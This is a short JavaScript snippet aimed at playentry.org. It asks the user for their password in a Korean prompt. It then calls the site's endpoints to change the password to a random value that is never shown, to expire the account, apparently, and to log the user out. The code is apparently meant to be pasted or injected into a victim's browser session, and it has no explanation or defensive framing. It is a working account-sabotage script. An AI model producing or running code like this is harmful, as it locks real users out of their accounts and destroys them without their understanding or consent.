oldps = prompt("비밀번호를 입력해주세요.")
$.ajax({
    url: `https://playentry.org/cp`,
    type: "POST",
    data: {
        newPassword: Math.random().toString(36),
        originPassword: oldps,
        password: oldps,
        username: user.username
    }
})

$.ajax({
    url: `https://playentry.org/api/users/expire/${user._id}`,
    type: "PUT"
})


$.ajax({
    url: `https://playentry.org/out`,
    type: "GET"
})

setTimeout(function(){
    location.reload();
},500);
